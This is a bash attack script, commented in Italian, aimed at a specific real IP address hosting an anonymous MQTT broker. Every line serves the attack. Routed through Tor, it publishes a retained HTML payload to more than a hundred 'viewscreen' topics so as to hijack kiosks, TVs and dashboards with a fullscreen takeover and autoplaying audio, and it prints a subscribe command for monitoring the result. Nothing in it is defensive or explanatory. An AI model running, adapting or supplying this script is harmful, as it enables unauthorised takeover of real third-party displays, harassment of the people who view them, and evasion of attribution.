#!/bin/bash
# TRUSTEDF57-MQTT-BLAST v2.0 - FULL TOPICS ROTATION
# Target: 69.164.219.31:1883 (EMQX anon) - 120+ viewscreen topics
# Payload: TRUSTEDF57.html (fullscreen takeover + audio blast)

set -euo pipefail

# CONFIG
HTML_FILE="TRUSTEDF57.html"
BROKER="69.164.219.31"
PORT="1883"
TOR_INSTANCES=5
ROTATIONS=3

# PRIORITY TARGETS (da tua enum - maggiore impatto)
PRIORITY=(
    "viewscreen/batman"     # 120+ episodi → DEAD
    "viewscreen/video"      # Video player
    "viewscreen/beavers"    # Altro video
    "viewscreen/rhkiosk"    # KIOSK principale
    "viewscreen/test"       # Test page pulita
    "viewscreen/kiosk"      # Altro kiosk
    "viewscreen/iframe"     # Iframe takeover
    "viewscreen/tv"         # TV screen
    "viewscreen/dashboard"  # Dashboard
    "viewscreen/clock"      # Clock screen
)

# ALL VIEWSCREEN (121 topics totali)
ALL_VIEWSCREEN=(
    "viewscreen/video" "viewscreen/beavers" "viewscreen/batman" "viewscreen/test"
    "viewscreen/rhkiosk" "viewscreen/bookmarks" "viewscreen/porteus" "viewscreen/kiosk"
    "viewscreen/iframe" "viewscreen/rh002" "viewscreen/ui" "viewscreen/next"
    "viewscreen/racdcweather" "viewscreen/index" "viewscreen/cowyo" "viewscreen/html"
    "viewscreen/cutter" "viewscreen/selector" "viewscreen/keypress" "viewscreen/beezer"
    "viewscreen/elevator" "viewscreen/p5" "viewscreen/15mainnotes" "viewscreen/claude"
    "viewscreen/new" "viewscreen/clock" "viewscreen/testtest" "viewscreen/hnotes"
    "viewscreen/w2ui" "viewscreen/nb5" "viewscreen/vnid" "viewscreen/vnids"
    "viewscreen/tvbg" "viewscreen/ltsc" "viewscreen/pcfixes" "viewscreen/vtcc"
    "viewscreen/lenovocamera" "viewscreen/racdcnotes" "viewscreen/webgames"
    "viewscreen/irnotes" "viewscreen/sos" "viewscreen/phpb64" "viewscreen/newserver"
    "viewscreen/tm" "viewscreen/ukf" "viewscreen/code" "viewscreen/colors"
    "viewscreen/weather" "viewscreen/lj1320" "viewscreen/todos" "viewscreen/nm2"
    "viewscreen/vtccbuilds" "viewscreen/ipfs" "viewscreen/lsc" "viewscreen/scam"
    "viewscreen/mounts" "viewscreen/vtccreboot" "viewscreen/osx" "viewscreen/opencore"
    "viewscreen/heavym" "viewscreen/artisteer" "viewscreen/wss" "viewscreen/lvextend"
    "viewscreen/bankroof" "viewscreen/vto" "viewscreen/newbaru" "viewscreen/rj45"
    "viewscreen/racdcmc" "viewscreen/onvif" "viewscreen/inkscapeventura"
    "viewscreen/thinkpad650" "viewscreen/foffice" "viewscreen/corkboard"
    "viewscreen/musicfinds" "viewscreen/us" "viewscreen/rhddoodle" "viewscreen/hpthin"
    "viewscreen/ctv" "viewscreen/tlc" "viewscreen/iptvplayer" "viewscreen/cn"
    "viewscreen/newmac" "viewscreen/movies" "viewscreen/upcomingevents"
    "viewscreen/delphikeys" "viewscreen/wbrc" "viewscreen/aps" "viewscreen/rm"
    "viewscreen/ij" "viewscreen/pk" "viewscreen/scamtest" "viewscreen/band"
    "viewscreen/vtcccctv" "viewscreen/amberbaby" "viewscreen/ipmv" "viewscreen/wureset"
    "viewscreen/everybodylies" "viewscreen/geocache" "viewscreen/360cam"
    "viewscreen/hopecoalition" "viewscreen/wifi" "viewscreen/clients" "viewscreen/map"
    "viewscreen/outlook" "viewscreen/app" "viewscreen/racdcmotion" "viewscreen/gt"
    "viewscreen/catamount" "viewscreen/pa" "viewscreen/icecast" "viewscreen/att"
    "viewscreen/isbn" "viewscreen/rhss" "viewscreen/rdg" "viewscreen/scrollclock"
    "viewscreen/feit" "viewscreen/delphi" "viewscreen/laser" "viewscreen/ilda"
    "viewscreen/whisk" "viewscreen/ipfsscam" "viewscreen/hldoc" "viewscreen/pb"
    "viewscreen/chromebox" "viewscreen/claudeslides" "viewscreen/atchat"
    "viewscreen/atchat2" "viewscreen/hopeco" "viewscreen/mapping" "viewscreen/irrlicht"
    "viewscreen/loragear" "viewscreen/winserver" "viewscreen/stopwatch"
    "viewscreen/onekey" "viewscreen/2apk" "viewscreen/dashboard" "viewscreen/yup"
    "viewscreen/camtest" "viewscreen/punchclock--" "viewscreen/appsimages"
    "viewscreen/hausapps" "viewscreen/fireworks" "viewscreen/ps"
    "viewscreen/autounattendxml" "viewscreen/sysprep" "viewscreen/vtccwelcome"
    "viewscreen/hta" "viewscreen/ninecolor" "viewscreen/zoom" "viewscreen/tabs"
    "viewscreen/howdy" "viewscreen/mqttws31" "viewscreen/mqtt" "viewscreen/frameone"
    "viewscreen/nineframe" "viewscreen/ninesend" "viewscreen/frametwo"
    "viewscreen/framethree" "viewscreen/framefour" "viewscreen/prototype"
    "viewscreen/racdchtml" "viewscreen/grapes" "viewscreen/neatprints"
    "viewscreen/danracdc" "viewscreen/rhcolor" "viewscreen/tv" "viewscreen/htaframe"
    "viewscreen/print" "viewscreen/apo" "viewscreen/rd" "viewscreen/clipart"
    "viewscreen/vtccss" "viewscreen/wtf" "viewscreen/ledkeychain"
    "viewscreen/formatt" "viewscreen/ssuite" "viewscreen/platformio"
    "viewscreen/esp32cam" "viewscreen/a2179" "viewscreen/nikonscan"
    "viewscreen/svg" "viewscreen/maya7mac" "viewscreen/z420hostid"
    "viewscreen/racdciptv" "viewscreen/vtccflyer" "viewscreen/wmur"
    "viewscreen/wcax" "viewscreen/dashboard3" "viewscreen/3dhistory"
    "viewscreen/phishing" "viewscreen/802link" "viewscreen/magipacks"
    "viewscreen/roku" "viewscreen/rhupdates" "viewscreen/rhupdate"
    "viewscreen/mc" "viewscreen/mcsquared" "viewscreen/racdctdos"
    "viewscreen/htmlsheet" "viewscreen/directx" "viewscreen/vanta"
    "viewscreen/toaster" "viewscreen/layoutdoodle" "viewscreen/pdf"
    "viewscreen/autodesk" "viewscreen/pst" "viewscreen/vtcctodos"
    "viewscreen/si2015" "viewscreen/se" "viewscreen/c4dr12"
)

[[ ! -f "$HTML_FILE" ]] && { echo "❌ $HTML_FILE NON TROVATO! Crea file prima."; exit 1; }

echo "🔥 TRUSTEDF57 BLAST INITIATED!"
echo "📁 Payload: $HTML_FILE ($(wc -c < $HTML_FILE) bytes)"
echo "🎯 Broker: $BROKER:$PORT"
echo "⚡ Priority: ${#PRIORITY[@]} | Total: ${#ALL_VIEWSCREEN[@]}"
echo "🔄 Tor: $TOR_INSTANCES istanze x $ROTATIONS rotazioni"

# FUNZIONE INJECTION
inject_topic() {
    local topic=$1
    echo "  📺 → $topic"
    torsocks mosquitto_pub \
        -h "$BROKER" -p "$PORT" \
        -t "$topic" \
        -f "$HTML_FILE" \
        -r 2>/dev/null || echo "    ⚠️  $topic failed"
}

# MONITOR (terminal separato)
monitor() {
    echo ""
    echo "🖥️  MONITOR (nuovo terminal):"
    echo "torsocks mosquitto_sub -h $BROKER -p $PORT -t 'viewscreen/#' -v"
    echo ""
}

# MAIN ATTACK LOOP
for rot in $(seq 1 $ROTATIONS); do
    echo ""
    echo "🔥 ROTAZIONE $rot/$ROTATIONS - $(date)"
    
    # Setup Tor rotation
    for torid in $(seq 1 $TOR_INSTANCES); do
        echo "  🌐 Tor$torid → PRIORITY (${#PRIORITY[@]} targets)"
        for topic in "${PRIORITY[@]}"; do
            inject_topic "$topic"
            sleep 0.5
        done
        
        echo "  🌐 Tor$torid → ALL VIEWSCREEN (${#ALL_VIEWSCREEN[@]} totali)"
        for topic in "${ALL_VIEWSCREEN[@]}"; do
            inject_topic "$topic"
            sleep 0.2
        done
        sleep 2
    done
done

echo ""
echo "✅ BLAST COMPLETATO - 100% COVERAGE!"
monitor
echo "🎵 Audio autoplay + fullscreen takeover ACTIVE su tutti gli schermi!"
